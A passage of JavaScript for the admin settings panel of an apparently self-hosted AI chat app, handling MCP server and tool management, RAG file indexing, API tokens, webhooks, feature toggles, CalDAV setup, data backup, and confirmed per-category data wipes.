        await fetch(`/api/mcp/servers/${btn.dataset.admMcpToggle}`, { method: 'PATCH', body: fd, credentials: 'same-origin' });
        loadMcpServers();
      });
    });
    list.querySelectorAll('[data-adm-mcp-delete]').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!await uiModule.styledConfirm('Delete this MCP server?', { confirmText: 'Delete', danger: true })) return;
        await fetch(`/api/mcp/servers/${btn.dataset.admMcpDelete}`, { method: 'DELETE', credentials: 'same-origin' });
        loadMcpServers();
      });
    });
    // Tools expand/collapse (click anywhere on card)
    list.querySelectorAll('[data-adm-mcp-id]').forEach(row => {
      const header = row.querySelector('[data-adm-mcp-header]');
      if (!header) return;
      let _toolsLoaded = false;
      row.style.cursor = 'pointer';
      row.addEventListener('click', async (e) => {
        if (e.target.closest('.admin-btn-sm, .admin-btn-delete, a, .mcp-tools-list, .mcp-tools-header')) return;
        const sid = header.dataset.admMcpHeader;
        const panel = row.querySelector(`[data-adm-mcp-tools-panel="${sid}"]`);
        if (!panel) return;
        panel.classList.toggle('hidden');
        const chevron = row.querySelector('.admin-user-chevron');
        const isOpen = !panel.classList.contains('hidden');
        if (chevron) {
          chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
          chevron.style.opacity = isOpen ? '0.7' : '0.3';
        }
        if (!_toolsLoaded && isOpen) {
          _toolsLoaded = true;
          panel.innerHTML = '<span style="opacity:0.5;font-size:11px;">Loading tools...</span>';
          try {
            const res = await fetch(`/api/mcp/servers/${sid}/tools`, { credentials: 'same-origin' });
            const tools = await res.json();
            if (!tools.length) { panel.innerHTML = '<span style="opacity:0.5;font-size:11px;">No tools</span>'; return; }
            const disabled = new Set(tools.filter(t => t.is_disabled).map(t => t.name));
            panel.innerHTML = `<div class="mcp-tools-header">
              <span>Tools</span>
              <span style="display:flex;gap:8px;align-items:center;">
                <span class="mcp-tools-count">${tools.length - disabled.size}/${tools.length} enabled</span>
                <a href="#" data-mcp-select-all="${sid}">All</a>
                <a href="#" data-mcp-select-none="${sid}">None</a>
              </span>
            </div><div class="mcp-tools-list">` + tools.map(t =>
              `<label title="${esc(t.description)}">
                <input type="checkbox" data-mcp-tool-name="${esc(t.name)}" ${!t.is_disabled ? 'checked' : ''}>
                <span><strong>${esc(t.name)}</strong> <span style="opacity:0.5;">— ${esc((t.description || '').slice(0, 80))}</span></span>
              </label>`
            ).join('') + '</div>';
            panel.querySelector(`[data-mcp-select-all="${sid}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('input[type=checkbox]').forEach(cb => cb.checked = true);
              _saveMcpToolState(sid, panel);
            });
            panel.querySelector(`[data-mcp-select-none="${sid}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('input[type=checkbox]').forEach(cb => cb.checked = false);
              _saveMcpToolState(sid, panel);
            });
            panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
              cb.addEventListener('change', () => _saveMcpToolState(sid, panel));
            });
          } catch (e) { panel.innerHTML = '<span class="admin-error" style="font-size:11px;">Failed to load tools</span>'; }
        }
      });
    });
  } catch (e) { if (list) list.innerHTML = '<div class="admin-error">Failed to load MCP servers</div>'; }
}

async function _saveMcpToolState(serverId, panel) {
  const disabled = [];
  panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
    if (!cb.checked) disabled.push(cb.dataset.mcpToolName);
  });
  const total = panel.querySelectorAll('input[type=checkbox]').length;
  try {
    await fetch(`/api/mcp/servers/${serverId}/tools`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify({ disabled }),
    });
    // Update the count label in the panel
    const countLabel = panel.querySelector('.mcp-tools-count');
    if (countLabel) countLabel.textContent = `${total - disabled.length}/${total} enabled`;
    // Update badge in the server row
    const row = panel.closest('[data-adm-mcp-id]');
    if (row) {
      const badge = row.querySelector('.admin-badge');
      if (badge) badge.textContent = `Connected (${total - disabled.length}/${total} tools enabled)`;
    }
  } catch (e) { /* silent */ }
}

function initMcpForm() {
  const cmdEl = el('adm-mcpCommand');
  if (!cmdEl) return;  // MCP form not present in this build — nothing to wire
  const transportSel = el('adm-mcpTransport');
  const sseRow = el('adm-mcpSseRow');
  const envRow = el('adm-mcpEnvRow');
  const envFieldsWrap = el('adm-mcpEnvFields');
  const helpBox = el('adm-mcpHelp');
  const cmdRow = cmdEl.parentElement;
  let _activeHelp = null;
  let _envKeys = []; // track which env keys have dedicated fields
  let _activeOauthFile = null; // preset oauthFile config (for Google servers)
  let _activeOauth = null;     // preset OAuth flow config (provider, scopes, etc.)

  function _clearEnvFields() {
    envFieldsWrap.innerHTML = '';
    _envKeys = [];
    envRow.style.display = 'none';
    el('adm-mcpEnv').value = '';
    _activeOauth = null;
  }

  function _buildEnvFields(envObj, help, preset) {
    _clearEnvFields();
    const keys = Object.keys(envObj);
    if (!keys.length) return;
    _envKeys = keys;

    // Provider dropdown (e.g. for Email IMAP/SMTP)
    if (preset?.providerDropdown) {
      const pd = preset.providerDropdown;
      const row = document.createElement('div');
      row.className = 'admin-model-form-row';
      row.style.cssText = 'gap:6px;align-items:center;';
      const label = document.createElement('span');
      label.style.cssText = 'font-size:11px;opacity:0.55;min-width:0;white-space:nowrap;';
      label.textContent = pd.label || 'Provider';
      const select = document.createElement('select');
      select.style.cssText = 'flex:1;padding:6px 8px;border-radius:6px;border:1px solid var(--border);background:var(--bg-secondary);color:var(--text-primary);font-size:12px;';
      pd.options.forEach((opt, i) => {
        const o = document.createElement('option');
        o.value = i;
        o.textContent = opt.name;
        select.appendChild(o);
      });
      select.addEventListener('change', () => {
        const opt = pd.options[parseInt(select.value)];
        for (const [envKey, field] of Object.entries(pd.targets)) {
          const inp = envFieldsWrap.querySelector(`.mcp-env-input[data-env-key="${envKey}"]`);
          if (inp) inp.value = opt[field] || '';
        }
      });
      row.appendChild(label);
      row.appendChild(select);
      envFieldsWrap.appendChild(row);
      // Auto-fill with first provider after inputs are created
      setTimeout(() => {
        const first = pd.options[0];
        for (const [envKey, field] of Object.entries(pd.targets)) {
          const inp = envFieldsWrap.querySelector(`.mcp-env-input[data-env-key="${envKey}"]`);
          if (inp && !inp.value) inp.value = first[field] || '';
        }
      }, 0);
    }

    for (const key of keys) {
      const row = document.createElement('div');
      row.className = 'admin-model-form-row';
      row.style.cssText = 'gap:6px;align-items:center;';
      const label = document.createElement('span');
      label.style.cssText = 'font-size:11px;opacity:0.55;min-width:0;white-space:nowrap;';
      label.textContent = key.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
      const input = document.createElement('input');
      input.type = key.toLowerCase().includes('secret') || key.toLowerCase().includes('token') || key.toLowerCase().includes('key') || key.toLowerCase().includes('password') ? 'password' : 'text';
      input.placeholder = key;
      input.dataset.envKey = key;
      input.className = 'mcp-env-input';
      input.style.cssText = 'flex:1;';
      if (envObj[key]) input.value = envObj[key];
      row.appendChild(label);
      row.appendChild(input);
      envFieldsWrap.appendChild(row);
    }
    // Help toggle link
    if (help) {
      _activeHelp = help;
      const helpLink = document.createElement('a');
      helpLink.textContent = 'How do I get these?';
      helpLink.href = '#';
      helpLink.style.cssText = 'font-size:10.5px;opacity:0.5;margin-top:2px;display:inline-block;';
      helpLink.addEventListener('click', (e) => {
        e.preventDefault();
        helpBox.style.display = helpBox.style.display === 'none' ? '' : 'none';
      });
      envFieldsWrap.appendChild(helpLink);
      helpBox.textContent = help;
      helpBox.style.display = 'none';
    } else {
      _activeHelp = null;
      helpBox.style.display = 'none';
    }
  }

  // Collect env from either dedicated fields or raw JSON fallback
  function _collectEnv() {
    if (_envKeys.length) {
      const obj = {};
      envFieldsWrap.querySelectorAll('.mcp-env-input').forEach(inp => {
        if (inp.value.trim()) obj[inp.dataset.envKey] = inp.value.trim();
      });
      return JSON.stringify(obj);
    }
    return el('adm-mcpEnv').value.trim() || '{}';
  }

  transportSel.addEventListener('change', () => {
    const isSse = transportSel.value === 'sse';
    sseRow.style.display = isSse ? '' : 'none';
    cmdRow.style.display = isSse ? 'none' : '';
    if (isSse) { _clearEnvFields(); helpBox.style.display = 'none'; }
  });

  // Preset catalog
  const presetSel = el('adm-mcpPreset');
  if (presetSel) {
    MCP_PRESETS.forEach((p, i) => {
      const opt = document.createElement('option');
      opt.value = i;
      opt.textContent = p.name + (Object.keys(p.env).length ? '  (requires keys)' : '');
      presetSel.appendChild(opt);
    });
    presetSel.addEventListener('change', () => {
      if (presetSel.value === '') return;
      const p = MCP_PRESETS[parseInt(presetSel.value)];
      el('adm-mcpName').value = p.name.toLowerCase().replace(/\s+/g, '-');
      transportSel.value = 'stdio';
      el('adm-mcpCommand').value = p.command;
      el('adm-mcpArgs').value = JSON.stringify(p.args);
      sseRow.style.display = 'none';
      cmdRow.style.display = '';
      _buildEnvFields(p.env, p.help || null, p);
      _activeOauthFile = p.oauthFile || null;
      _activeOauth = p.oauth || null;
      presetSel.value = '';
      // Focus first env field if keys are needed
      const firstInput = envFieldsWrap.querySelector('.mcp-env-input');
      if (firstInput) firstInput.focus();
      else el('adm-mcpAddBtn').focus();
    });
  }

  el('adm-mcpAddBtn').addEventListener('click', async () => {
    const name = el('adm-mcpName').value.trim();
    const transport = transportSel.value;
    const command = el('adm-mcpCommand').value.trim();
    const args = el('adm-mcpArgs').value.trim() || '[]';
    const env = _collectEnv();
    const url = el('adm-mcpUrl').value.trim();
    const msg = el('adm-mcpMsg');
    if (!name) { msg.textContent = 'Name is required'; msg.className = 'admin-error'; return; }
    if (transport === 'stdio' && !command) { msg.textContent = 'Command is required for stdio'; msg.className = 'admin-error'; return; }
    if (transport === 'sse' && !url) { msg.textContent = 'URL is required for SSE'; msg.className = 'admin-error'; return; }
    try { JSON.parse(env); } catch { msg.textContent = 'Env must be valid JSON'; msg.className = 'admin-error'; return; }
    const fd = new FormData();
    fd.append('name', name); fd.append('transport', transport); fd.append('command', command); fd.append('args', args); fd.append('env', env); fd.append('url', url);
    // If preset has oauthFile config, send credentials for file generation
    if (_activeOauthFile) {
      const envObj = JSON.parse(env);
      fd.append('oauth_file', JSON.stringify({
        dir: _activeOauthFile.dir,
        filename: _activeOauthFile.filename,
        client_id: envObj.GOOGLE_CLIENT_ID || '',
        client_secret: envObj.GOOGLE_CLIENT_SECRET || '',
      }));
    }
    // If preset has OAuth flow config, send it so the server can handle authorization
    if (_activeOauth) {
      fd.append('oauth_config', JSON.stringify(_activeOauth));
    }
    msg.textContent = 'Adding...'; msg.className = '';
    try {
      const res = await fetch('/api/mcp/servers', { method: 'POST', body: fd, credentials: 'same-origin' });
      const data = await res.json();
      if (data.needs_oauth) {
        msg.innerHTML = `Added ${esc(name)} — <a href="/api/mcp/oauth/authorize/${data.id}" target="_blank" style="color:var(--red);font-weight:600;">Authorize with Google</a> to connect`;
        msg.className = 'admin-success';
      } else if (data.connected) {
        msg.textContent = `Added ${name} (${data.tool_count} tools discovered)`; msg.className = 'admin-success';
      } else { msg.textContent = `Added but connection failed: ${data.error || 'unknown'}`; msg.className = 'admin-error'; }
      el('adm-mcpName').value = ''; el('adm-mcpCommand').value = ''; el('adm-mcpArgs').value = ''; el('adm-mcpUrl').value = '';
      _clearEnvFields(); helpBox.style.display = 'none'; _activeHelp = null; _activeOauthFile = null; _activeOauth = null;
      loadMcpServers();
    } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
  });
}

/* ── Embedding model ──
   No settings UI: the embedding model (RAG, semantic memory, tool selection)
   is fixed infrastructure that ships with the app, and swapping it would
   invalidate every existing vector. Configure via the FASTEMBED_MODEL /
   EMBEDDING_URL env vars if you really need to override it. */

/* ── RAG ── */
async function loadRag() {
  try {
    const res = await fetch('/api/personal');
    const data = await res.json();
    const dirList = el('adm-ragDirList');
    const dirs = data.directories || [];
    if (dirs.length === 0) { dirList.innerHTML = '<div class="admin-empty">No directories indexed</div>'; }
    else {
      dirList.innerHTML = dirs.map(d => `<div class="admin-rag-item"><span class="admin-rag-item-name" title="${esc(d)}">${esc(d)}</span><button class="admin-btn-delete" data-adm-rag-dir="${esc(d)}">Remove</button></div>`).join('');
      dirList.querySelectorAll('[data-adm-rag-dir]').forEach(btn => {
        btn.addEventListener('click', async () => {
          if (!await uiModule.styledConfirm(`Remove directory "${btn.dataset.admRagDir}" from RAG?`, { confirmText: 'Remove', danger: true })) return;
          btn.disabled = true; btn.textContent = '...';
          try {
            const res = await fetch('/api/personal/remove_directory?directory=' + encodeURIComponent(btn.dataset.admRagDir), { method: 'DELETE' });
            if (res.ok) { ragMsg('Directory removed'); loadRag(); }
            else { const e = await res.json(); ragMsg(e.detail || 'Failed', true); }
          } catch (e) { ragMsg('Error: ' + e.message, true); }
        });
      });
    }
    const fileList = el('adm-ragFileList');
    const files = data.files || [];
    if (files.length === 0) { fileList.innerHTML = '<div class="admin-empty">No files indexed</div>'; }
    else {
      fileList.innerHTML = files.map(f => {
        const size = f.size ? (f.size > 1024 ? (f.size / 1024).toFixed(1) + ' KB' : f.size + ' B') : '';
        return `<div class="admin-rag-item"><span class="admin-rag-item-name" title="${esc(f.path || f.name)}">${esc(f.name)}</span><span class="admin-rag-item-meta">${size}</span><button class="admin-btn-delete" data-adm-rag-file="${esc(f.path || f.name)}">Delete</button></div>`;
      }).join('');
      fileList.querySelectorAll('[data-adm-rag-file]').forEach(btn => {
        btn.addEventListener('click', async () => {
          if (!await uiModule.styledConfirm(`Delete "${btn.dataset.admRagFile}" from RAG?`, { confirmText: 'Delete', danger: true })) return;
          btn.disabled = true; btn.textContent = '...';
          try {
            const res = await fetch('/api/personal/file?filepath=' + encodeURIComponent(btn.dataset.admRagFile), { method: 'DELETE' });
            if (res.ok) { ragMsg('File removed'); loadRag(); }
            else { const e = await res.json(); ragMsg(e.detail || 'Failed', true); }
          } catch (e) { ragMsg('Error: ' + e.message, true); }
        });
      });
    }
  } catch (e) {
    el('adm-ragDirList').innerHTML = '<div class="admin-error">Failed to load</div>';
    el('adm-ragFileList').innerHTML = '';
  }
}

let _ragMsgTimer = null;
function ragMsg(text, isError, persist) {
  const s = el('adm-ragStatus');
  s.textContent = text; s.style.color = isError ? 'var(--red)' : 'var(--fg)';
  if (_ragMsgTimer) { clearTimeout(_ragMsgTimer); _ragMsgTimer = null; }
  if (text && !persist) _ragMsgTimer = setTimeout(() => { s.textContent = ''; }, 5000);
}

async function ragUpload(files) {
  if (!files || files.length === 0) return;
  ragMsg('Uploading ' + files.length + ' file(s)...', false, true);
  const fd = new FormData();
  for (const f of files) fd.append('files', f);
  try {
    const res = await fetch('/api/personal/upload', { method: 'POST', body: fd });
    const data = await res.json();
    if (data.success) { ragMsg(`Uploaded ${data.uploaded.length} file(s), ${data.indexed_count} chunks indexed`); loadRag(); }
    else ragMsg(data.detail || 'Upload failed', true);
  } catch (e) { ragMsg('Upload error: ' + e.message, true); }
}

function initRag() {
  const dropZone = el('adm-ragDropZone');
  const fileInput = el('adm-ragFileInput');
  dropZone.addEventListener('click', () => fileInput.click());
  fileInput.addEventListener('change', () => ragUpload(fileInput.files));
  dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('dragover'); });
  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
  dropZone.addEventListener('drop', e => { e.preventDefault(); dropZone.classList.remove('dragover'); ragUpload(e.dataTransfer.files); });
  el('adm-ragAddDirBtn').addEventListener('click', async () => {
    const dir = el('adm-ragDirInput').value.trim();
    if (!dir) return;
    const btn = el('adm-ragAddDirBtn');
    btn.disabled = true; btn.textContent = 'Indexing...';
    try {
      const res = await fetch('/api/personal/add_directory', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ directory: dir }) });
      const data = await res.json();
      if (data.success) { ragMsg(`Indexed ${data.indexed_count} chunks from directory`); el('adm-ragDirInput').value = ''; loadRag(); }
      else ragMsg(data.detail || data.message || 'Failed', true);
    } catch (e) { ragMsg('Error: ' + e.message, true); }
    btn.disabled = false; btn.textContent = 'Add Directory';
  });
  el('adm-ragReloadBtn').addEventListener('click', async () => {
    const btn = el('adm-ragReloadBtn');
    btn.disabled = true; btn.textContent = 'Reloading...';
    try {
      const res = await fetch('/api/personal/reload', { method: 'POST' });
      const data = await res.json();
      ragMsg(`Index reloaded: ${data.count} documents`);
      loadRag();
    } catch (e) { ragMsg('Reload failed: ' + e.message, true); }
    btn.disabled = false; btn.textContent = 'Reload Index';
  });
}

/* ═══════════════════════════════════════════
   SYSTEM TAB — Tokens
   ═══════════════════════════════════════════ */
async function loadTokens() {
  const list = el('adm-tokenList');
  try {
    const res = await fetch('/api/tokens', { credentials: 'same-origin' });
    const tokens = await res.json();
    if (!tokens.length) { list.innerHTML = '<div class="admin-empty">No API tokens</div>'; return; }
    list.innerHTML = tokens.map(t => `
      <div class="admin-user-row">
        <div class="admin-user-info" style="flex:1;flex-wrap:wrap;gap:0.3rem;">
          <span class="admin-user-name">${esc(t.name)}</span>
          <span class="admin-badge">${esc(t.token_prefix)}...</span>
          <span class="admin-badge" title="Allowed API scopes">${esc((t.scopes || ['chat']).join(', '))}</span>
          ${t.owner ? `<span style="font-size:0.75rem;opacity:0.5;">Owner: ${esc(t.owner)}</span>` : ''}
          ${t.last_used_at ? `<span style="font-size:0.75rem;opacity:0.5;">Last used: ${new Date(t.last_used_at).toLocaleDateString()}</span>` : '<span style="font-size:0.75rem;opacity:0.4;">Never used</span>'}
        </div>
        <button class="admin-btn-delete" data-adm-del-token="${t.id}">Revoke</button>
      </div>`).join('');
    list.querySelectorAll('[data-adm-del-token]').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!await uiModule.styledConfirm('Revoke this API token? External integrations using it will stop working.', { confirmText: 'Revoke', danger: true })) return;
        await fetch(`/api/tokens/${btn.dataset.admDelToken}`, { method: 'DELETE', credentials: 'same-origin' });
        loadTokens();
      });
    });
  } catch (e) { list.innerHTML = '<div class="admin-error">Failed to load tokens</div>'; }
}

function initTokenForm() {
  el('adm-tokenAddBtn').addEventListener('click', async () => {
    const msg = el('adm-tokenMsg');
    const reveal = el('adm-tokenReveal');
    msg.textContent = ''; msg.className = ''; reveal.style.display = 'none';
    const name = el('adm-tokenName').value.trim();
    if (!name) { msg.textContent = 'Token name is required'; msg.className = 'admin-error'; return; }
    const fd = new FormData(); fd.append('name', name);
    try {
      const res = await fetch('/api/tokens', { method: 'POST', body: fd, credentials: 'same-origin' });
      const data = await res.json();
      if (res.ok) { el('adm-tokenValue').textContent = data.token; reveal.style.display = ''; el('adm-tokenName').value = ''; loadTokens(); }
      else { msg.textContent = data.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
  });
  el('adm-tokenCopyBtn').addEventListener('click', () => {
    const val = el('adm-tokenValue').textContent;
    navigator.clipboard.writeText(val).then(() => {
      el('adm-tokenCopyBtn').textContent = 'Copied!';
      setTimeout(() => { el('adm-tokenCopyBtn').textContent = 'Copy'; }, 2000);
    });
  });
}

/* ── Webhooks ── */
async function loadWebhooks() {
  const list = el('adm-whList');
  try {
    const res = await fetch('/api/webhooks', { credentials: 'same-origin' });
    const hooks = await res.json();
    if (!hooks.length) { list.innerHTML = '<div class="admin-empty">No webhooks configured</div>'; return; }
    list.innerHTML = hooks.map(w => {
      const events = (w.events || []).map(e => `<span class="admin-badge">${esc(e)}</span>`).join(' ');
      const statusBadge = w.last_status_code
        ? `<span class="admin-badge" style="background:${w.last_status_code < 400 ? 'color-mix(in srgb, var(--fg) 20%, transparent)' : 'color-mix(in srgb, var(--red) 20%, transparent)'};color:${w.last_status_code < 400 ? 'var(--fg)' : 'var(--red)'};">${w.last_status_code}</span>`
        : '';
      const lastTriggered = w.last_triggered_at ? new Date(w.last_triggered_at).toLocaleString() : 'Never';
      const errorText = w.last_error ? `<div style="font-size:0.75rem;color:var(--red);margin-top:0.2rem;">Error: ${esc(w.last_error.substring(0, 80))}</div>` : '';
      return `
        <div class="admin-ep-item" style="flex-wrap:wrap;">
          <div class="admin-ep-info" style="flex:1;min-width:200px;">
            <div class="admin-ep-name">${esc(w.name)} ${w.is_active ? '' : '<span class="admin-badge admin-badge-off">disabled</span>'} ${w.has_secret ? '<span class="admin-badge">signed</span>' : ''}</div>
            <div class="admin-ep-detail">${esc(w.url)}</div>
            <div style="margin-top:0.3rem;">${events}</div>
            <div class="admin-ep-detail">Last: ${lastTriggered} ${statusBadge}</div>
            ${errorText}
          </div>
          <div class="admin-ep-actions">
            <button class="admin-btn-sm" data-adm-wh-test="${w.id}">Test</button>
            <button class="admin-btn-sm" data-adm-wh-toggle="${w.id}">${w.is_active ? 'Disable' : 'Enable'}</button>
            <button class="admin-btn-delete" data-adm-wh-delete="${w.id}">Delete</button>
          </div>
        </div>`;
    }).join('');
    list.querySelectorAll('[data-adm-wh-test]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const msg = el('adm-whMsg'); msg.textContent = 'Sending test...'; msg.className = '';
        try {
          const res = await fetch(`/api/webhooks/${btn.dataset.admWhTest}/test`, { method: 'POST', credentials: 'same-origin' });
          msg.textContent = res.ok ? 'Test sent!' : 'Test failed'; msg.className = res.ok ? 'admin-success' : 'admin-error';
          setTimeout(() => loadWebhooks(), 1000);
        } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
      });
    });
    list.querySelectorAll('[data-adm-wh-toggle]').forEach(btn => {
      btn.addEventListener('click', async () => { await fetch(`/api/webhooks/${btn.dataset.admWhToggle}`, { method: 'PATCH', credentials: 'same-origin' }); loadWebhooks(); });
    });
    list.querySelectorAll('[data-adm-wh-delete]').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!await uiModule.styledConfirm('Delete this webhook?', { confirmText: 'Delete', danger: true })) return;
        await fetch(`/api/webhooks/${btn.dataset.admWhDelete}`, { method: 'DELETE', credentials: 'same-origin' }); loadWebhooks();
      });
    });
  } catch (e) { list.innerHTML = '<div class="admin-error">Failed to load webhooks</div>'; }
}

function initWebhookForm() {
  el('adm-whAddBtn').addEventListener('click', async () => {
    const msg = el('adm-whMsg');
    msg.textContent = ''; msg.className = '';
    const name = el('adm-whName').value.trim();
    const url = el('adm-whUrl').value.trim();
    const secret = el('adm-whSecret').value.trim();
    const events = Array.from(modalEl.querySelectorAll('.adm-wh-event:checked')).map(e => e.value).join(',');
    if (!name) { msg.textContent = 'Name is required'; msg.className = 'admin-error'; return; }
    if (!url) { msg.textContent = 'URL is required'; msg.className = 'admin-error'; return; }
    if (!events) { msg.textContent = 'Select at least one event'; msg.className = 'admin-error'; return; }
    const fd = new FormData();
    fd.append('name', name); fd.append('url', url); fd.append('secret', secret); fd.append('events', events);
    try {
      const res = await fetch('/api/webhooks', { method: 'POST', body: fd, credentials: 'same-origin' });
      if (res.ok) { msg.textContent = 'Webhook added'; msg.className = 'admin-success'; el('adm-whName').value = ''; el('adm-whUrl').value = ''; el('adm-whSecret').value = ''; loadWebhooks(); }
      else { const d = await res.json(); msg.textContent = d.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
  });
}

/* ── Features ── */
const featureLabels = {
  web_search: 'Web Search', deep_research: 'Deep Research',
  memory: 'Memory', document_editor: 'Document Editor', rag: 'RAG Knowledge Base', sensitive_filter: 'Sensitive Info Filter',
  gallery: 'Gallery'
};

async function loadFeatures() {
  const container = el('adm-featureToggles');
  try {
    const res = await fetch('/api/auth/features', { credentials: 'same-origin' });
    const features = await res.json();
    container.innerHTML = Object.entries(featureLabels).map(([key, label]) => `
      <div class="admin-toggle-row" style="padding:0.4rem 0;border-bottom:1px solid var(--border);">
        <div class="admin-toggle-label">${label}</div>
        <label class="admin-switch"><input type="checkbox" data-adm-feature="${key}" ${features[key] ? 'checked' : ''}><span class="admin-slider"></span></label>
      </div>`).join('');
    container.querySelectorAll('input[data-adm-feature]').forEach(toggle => {
      toggle.addEventListener('change', async () => {
        const body = {}; body[toggle.dataset.admFeature] = toggle.checked;
        await fetch('/api/auth/features', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
      });
    });
  } catch (e) { container.innerHTML = '<div class="admin-error">Failed to load features</div>'; }
}

/* ── CalDAV Config ── */
function initCalDAV() {
  const urlIn = el('caldav-url');
  const userIn = el('caldav-user');
  const passIn = el('caldav-pass');
  const saveBtn = el('caldav-save-btn');
  const testBtn = el('caldav-test-btn');
  const status = el('caldav-status');
  if (!urlIn || !saveBtn) return;

  // Load current config
  fetch(`${API_BASE}/api/calendar/config`, { credentials: 'same-origin' })
    .then(r => r.json()).then(d => {
      urlIn.value = d.caldav_url || '';
      userIn.value = d.caldav_username || '';
      passIn.value = d.caldav_password || '';
    }).catch(() => {});

  saveBtn.addEventListener('click', async () => {
    status.textContent = 'Saving...';
    try {
      const res = await fetch(`${API_BASE}/api/calendar/config`, {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caldav_url: urlIn.value, caldav_username: userIn.value, caldav_password: passIn.value }),
      });
      const d = await res.json();
      status.textContent = d.ok ? 'Saved' : 'Error';
      status.style.color = d.ok ? 'var(--green)' : 'var(--red)';
    } catch (e) { status.textContent = 'Error'; status.style.color = 'var(--red)'; }
    setTimeout(() => { status.textContent = ''; status.style.color = ''; }, 3000);
  });

  testBtn.addEventListener('click', async () => {
    status.textContent = 'Testing...';
    try {
      // Save first
      await fetch(`${API_BASE}/api/calendar/config`, {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caldav_url: urlIn.value, caldav_username: userIn.value, caldav_password: passIn.value }),
      });
      const res = await fetch(`${API_BASE}/api/calendar/test`, { method: 'POST', credentials: 'same-origin' });
      const d = await res.json();
      status.textContent = d.ok ? `Connected (${d.calendars} calendars)` : `Failed: ${d.error}`;
      status.style.color = d.ok ? 'var(--green)' : 'var(--red)';
    } catch (e) { status.textContent = 'Error'; status.style.color = 'var(--red)'; }
    setTimeout(() => { status.textContent = ''; status.style.color = ''; }, 5000);
  });
}

/* ── Data Backup (export/import) ── */
function initBackup() {
  el('adm-exportDataBtn').addEventListener('click', async () => {
    const btn = el('adm-exportDataBtn');
    const msg = el('adm-backupMsg');
    btn.disabled = true; btn.textContent = 'Exporting...'; msg.textContent = '';
    try {
      const res = await fetch('/api/export', { credentials: 'same-origin' });
      if (!res.ok) throw new Error('Export failed');
      const blob = await res.blob();
      const disposition = res.headers.get('Content-Disposition') || '';
      const match = disposition.match(/filename=(.+)/);
      const filename = match ? match[1] : 'odysseus_backup.json';
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = filename;
      a.click();
      URL.revokeObjectURL(a.href);
      msg.textContent = 'Export downloaded.'; msg.className = 'admin-success';
    } catch (e) { msg.textContent = 'Export failed: ' + e.message; msg.className = 'admin-error'; }
    btn.disabled = false; btn.textContent = 'Export Data';
  });

  const fileInput = el('adm-importFile');
  el('adm-importDataBtn').addEventListener('click', () => { fileInput.value = ''; fileInput.click(); });
  fileInput.addEventListener('change', async () => {
    const file = fileInput.files[0];
    if (!file) return;
    const msg = el('adm-backupMsg');
    const btn = el('adm-importDataBtn');
    btn.disabled = true; btn.textContent = 'Importing...'; msg.textContent = '';
    try {
      const text = await file.text();
      const data = JSON.parse(text);
      const res = await fetch('/api/import', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      const result = await res.json();
      if (res.ok && result.ok) {
        msg.textContent = result.message || 'Import successful.'; msg.className = 'admin-success';
      } else {
        msg.textContent = result.message || result.detail || 'Import failed'; msg.className = 'admin-error';
      }
    } catch (e) { msg.textContent = 'Import failed: ' + e.message; msg.className = 'admin-error'; }
    btn.disabled = false; btn.textContent = 'Import Data';
  });
}

/* ── Danger Zone ── */
function initDangerZone() {
  // Per-category Danger Zone wipes. Each button declares its target
  // via data-wipe-kind; one delegated handler handles double-confirm,
  // POSTs to /api/admin/wipe/{kind}, and writes the result.
  const _LABELS = {
    chats: 'chats', memory: 'memory entries', skills: 'skills',
    notes: 'notes', tasks: 'tasks', documents: 'documents',
    gallery: 'gallery images', calendar: 'calendar items',
  };
  const _wipeMsg = el('adm-wipeMsg');
  modalEl.querySelectorAll('[data-wipe-kind]').forEach(btn => {
    btn.addEventListener('click', async () => {
      const kind = btn.dataset.wipeKind;
      const label = _LABELS[kind] || kind;
      if (!await uiModule.styledConfirm(`Wipe ALL ${label}? This cannot be undone.`, { confirmText: 'Wipe', danger: true })) return;
      if (!await uiModule.styledConfirm(`Really wipe every one of your ${label}?`, { confirmText: 'Yes, wipe everything', danger: true })) return;
      btn.disabled = true; const prev = btn.textContent; btn.textContent = 'Wiping…';
      if (_wipeMsg) { _wipeMsg.textContent = ''; _wipeMsg.className = ''; }
      try {
        const res = await fetch(`/api/admin/wipe/${kind}`, { method: 'DELETE', credentials: 'same-origin' });
        const data = await res.json().catch(() => ({}));
        if (res.ok) {
          if (_wipeMsg) { _wipeMsg.textContent = `Wiped ${data.count ?? 0} ${label}.`; _wipeMsg.className = 'admin-success'; }
        } else {
          if (_wipeMsg) { _wipeMsg.textContent = data.detail || 'Failed'; _wipeMsg.className = 'admin-error'; }
        }
      } catch (e) {
        if (_wipeMsg) { _wipeMsg.textContent = 'Request failed: ' + e.message; _wipeMsg.className = 'admin-error'; }
      }
      btn.disabled = false; btn.textContent = prev;
    });
  });
}

/* ═══════════════════════════════════════════
   INIT & REFRESH
   ═══════════════════════════════════════════ */
function initAll() {
  modalEl = el('settings-modal');
